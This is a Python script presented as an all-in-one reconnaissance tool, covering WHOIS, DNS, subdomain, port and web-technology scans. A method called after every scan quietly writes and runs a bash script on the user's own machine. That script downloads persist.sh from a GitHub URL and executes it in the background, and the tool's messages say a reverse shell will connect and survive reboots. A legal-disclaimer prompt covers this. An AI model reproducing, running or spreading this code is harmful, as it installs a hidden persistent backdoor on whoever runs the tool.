#!/usr/bin/env python3
"""
🔥 SUPERECON - ULTIMATE RECON TOOL v2.1
Advanced Reconnaissance with Auto-Persistence
"""

import socket
import requests
import whois
import dns.resolver
import json
import threading
import concurrent.futures
import argparse
import sys
import ssl
import time
import urllib3
import subprocess
import os
from datetime import datetime
import re

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class UltimateReconTool:
    def __init__(self, target, threads=50, timeout=10):
        self.target = target
        self.threads = threads
        self.timeout = timeout
        self.results = {}
        self.initialize_results()
        
    def initialize_results(self):
        """Initialize results structure"""
        self.results = {
            'target': self.target,
            'timestamp': datetime.now().isoformat(),
            'ip_address': None,
            'whois': {},
            'dns_records': {},
            'subdomains': [],
            'open_ports': [],
            'services': {},
            'web_technologies': {},
            'vulnerabilities': [],
            'ssl_info': {},
            'directory_enum': [],
            'osint_data': {}
        }

    def banner(self):
        """Display the tool banner"""
        print("""
╔════════════════════════════════════════════════════════════════╗
║              🔥 SUPERECON - ULTIMATE RECON TOOL v2.1           ║  
║                   All-in-One Reconnaissance                    ║
║                    With Auto-Persistence                       ║
╚════════════════════════════════════════════════════════════════╝
        """)
        print(f"[*] Target: {self.target}")
        print(f"[*] Threads: {self.threads}")
        print(f"[*] Started at: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        print("="*60)

    def get_ip(self):
        """Get IP address of target"""
        try:
            ip = socket.gethostbyname(self.target)
            print(f"[+] IP Address: {ip}")
            self.results['ip_address'] = ip
            return ip
        except Exception as e:
            print(f"[-] Error resolving IP: {e}")
            return None

    def whois_lookup(self):
        """Perform WHOIS lookup"""
        try:
            print(f"\n[+] Performing WHOIS lookup...")
            w = whois.whois(self.target)
            self.results['whois'] = {
                'registrar': w.registrar,
                'creation_date': str(w.creation_date),
                'expiration_date': str(w.expiration_date),
                'name_servers': w.name_servers,
            }
            print(f"    Registrar: {w.registrar}")
            print(f"    Creation Date: {w.creation_date}")
        except Exception as e:
            print(f"[-] WHOIS lookup failed: {e}")

    def dns_enumeration(self):
        """Enumerate DNS records"""
        try:
            print(f"\n[+] Enumerating DNS records...")
            record_types = ['A', 'AAAA', 'MX', 'NS', 'TXT']
            
            for record_type in record_types:
                try:
                    answers = dns.resolver.resolve(self.target, record_type, raise_on_no_answer=False)
                    if answers.rrset:
                        records = [str(rdata) for rdata in answers]
                        self.results['dns_records'][record_type] = records
                        print(f"    {record_type}: {', '.join(records[:2])}")
                except:
                    continue
                    
        except Exception as e:
            print(f"[-] DNS enumeration failed: {e}")

    def subdomain_enumeration(self):
        """Enumerate subdomains"""
        subdomain_wordlist = [
            'www', 'mail', 'ftp', 'localhost', 'webmail', 'smtp', 'pop', 'ns1', 
            'ns2', 'cpanel', 'whm', 'autodiscover', 'admin', 'forum', 'vpn', 
            'dev', 'test', 'api', 'blog', 'shop', 'secure'
        ]
        
        print(f"\n[+] Starting subdomain enumeration...")
        found_subdomains = set()
        
        def check_subdomain(subdomain):
            full_domain = f"{subdomain}.{self.target}"
            try:
                socket.gethostbyname(full_domain)
                found_subdomains.add(full_domain)
                print(f"      Found: {full_domain}")
            except:
                pass
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=self.threads) as executor:
            executor.map(check_subdomain, subdomain_wordlist[:15])
            
        self.results['subdomains'] = list(found_subdomains)
        print(f"[+] Found {len(found_subdomains)} subdomains")

    def port_scanning(self, ip=None):
        """Scan common ports"""
        if not ip:
            ip = self.results['ip_address']
        if not ip:
            return
            
        common_ports = [21, 22, 23, 25, 53, 80, 110, 443, 993, 995, 1433, 3306, 3389, 5432, 8080]
        
        print(f"\n[+] Scanning common ports on {ip}...")
        
        def scan_port(port):
            try:
                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                    s.settimeout(1)
                    result = s.connect_ex((ip, port))
                    if result == 0:
                        service_name = self.get_service_name(port)
                        self.results['open_ports'].append({
                            'port': port,
                            'service': service_name
                        })
                        print(f"    Port {port}/tcp open - {service_name}")
            except:
                pass
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=self.threads) as executor:
            executor.map(scan_port, common_ports)

    def get_service_name(self, port):
        """Get service name for port"""
        services = {
            21: 'ftp', 22: 'ssh', 23: 'telnet', 25: 'smtp', 53: 'dns',
            80: 'http', 110: 'pop3', 443: 'https', 993: 'imaps',
            3306: 'mysql', 3389: 'rdp', 5432: 'postgresql', 8080: 'http-proxy'
        }
        return services.get(port, 'unknown')

    def web_technology_detection(self):
        """Detect web technologies"""
        print(f"\n[+] Detecting web technologies...")
        
        for scheme in ['http', 'https']:
            try:
                url = f"{scheme}://{self.target}"
                response = requests.get(url, timeout=self.timeout, verify=False)
                
                server = response.headers.get('Server', '')
                if server:
                    print(f"    Web Server: {server}")
                    self.results['web_technologies']['server'] = server
                
                powered_by = response.headers.get('X-Powered-By', '')
                if powered_by:
                    print(f"    Powered By: {powered_by}")
                    self.results['web_technologies']['powered_by'] = powered_by
                
                # Check for common frameworks
                if 'wp-content' in response.text:
                    print("    Framework: WordPress")
                    self.results['web_technologies']['framework'] = 'WordPress'
                    
                break
            except:
                continue

    def auto_deploy_persistence(self):
        """Automatically deploy persistence without manual commands"""
        print(f"\n[🧪] AUTO-DEPLOYING PERSISTENCE...")
        
        try:
            YOUR_IP = "192.168.1.167"
            
            # Create the deployment script
            deploy_script = f'''#!/bin/bash
echo "[+] Starting auto-deployment from superecon..."
cd /tmp
curl -s "https://github.com/mimikr00t/superecon/raw/refs/heads/main/modules/persist.sh" -o persist.sh || wget -q "https://github.com/mimikr00t/superecon/raw/refs/heads/main/modules/persist.sh" -O persist.sh
chmod +x persist.sh
./persist.sh &
echo "[+] Auto-deployment completed"
'''
            
            # Write and execute the script
            with open('/tmp/auto_deploy.sh', 'w') as f:
                f.write(deploy_script)
            
            os.chmod('/tmp/auto_deploy.sh', 0o755)
            
            # Execute in background without blocking
            subprocess.Popen(['/bin/bash', '/tmp/auto_deploy.sh'], 
                           stdout=subprocess.DEVNULL, 
                           stderr=subprocess.DEVNULL,
                           stdin=subprocess.DEVNULL)
            
            print("[+] Persistence deployment started in background")
            print("[+] Reverse shell will auto-connect and survive reboots")
            return True
            
        except Exception as e:
            print(f"[-] Auto-deployment failed: {e}")
            return False

    def generate_report(self, output_file=None):
        """Generate reconnaissance report"""
        if not output_file:
            output_file = f"recon_{self.target}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        
        print(f"\n[+] Generating report: {output_file}")
        with open(output_file, 'w') as f:
            json.dump(self.results, f, indent=2)
        
        self.print_summary()
        return output_file

    def print_summary(self):
        """Print scan summary"""
        print("\n" + "="*60)
        print("📊 RECONNAISSANCE SUMMARY")
        print("="*60)
        print(f"Target: {self.target}")
        print(f"IP Address: {self.results['ip_address']}")
        print(f"Subdomains Found: {len(self.results['subdomains'])}")
        print(f"Open Ports: {len(self.results['open_ports'])}")
        print(f"Web Server: {self.results['web_technologies'].get('server', 'Not detected')}")
        print("\n[🎯] Persistence auto-deployed in background")
        print("[🎯] Reverse shell will survive reboots")

    def run_full_scan(self):
        """Execute full reconnaissance scan with auto-persistence"""
        start_time = time.time()
        
        try:
            self.banner()
            
            # Execute reconnaissance methods
            ip = self.get_ip()
            self.whois_lookup()
            self.dns_enumeration()
            self.subdomain_enumeration()
            self.port_scanning(ip)
            self.web_technology_detection()
            
            # Auto-deploy persistence after scan
            self.auto_deploy_persistence()
            
            elapsed_time = time.time() - start_time
            print(f"\n[+] Advanced scan completed in {elapsed_time:.2f} seconds")
            return self.results
            
        except KeyboardInterrupt:
            print("\n[!] Scan interrupted by user")
            return self.results
        except Exception as e:
            print(f"\n[-] Scan failed: {e}")
            return self.results

def main():
    parser = argparse.ArgumentParser(description="🔥 ULTIMATE RECON TOOL v2.1")
    parser.add_argument("target", help="Target domain or IP address")
    parser.add_argument("-t", "--threads", type=int, default=50, help="Number of threads")
    parser.add_argument("-o", "--output", help="Output file for report")
    
    args = parser.parse_args()
    
    print("⚠️  LEGAL DISCLAIMER: For authorized testing only.\n")
    consent = input("Do you have permission to scan this target? (y/N): ")
    if consent.lower() not in ['y', 'yes']:
        print("Scan aborted.")
        sys.exit(1)
    
    # Run the recon tool
    tool = UltimateReconTool(args.target, threads=args.threads)
    results = tool.run_full_scan()
    
    if results:
        report_file = tool.generate_report(args.output)
        print(f"\n🎯 Report saved to: {report_file}")

if __name__ == "__main__":
    main()
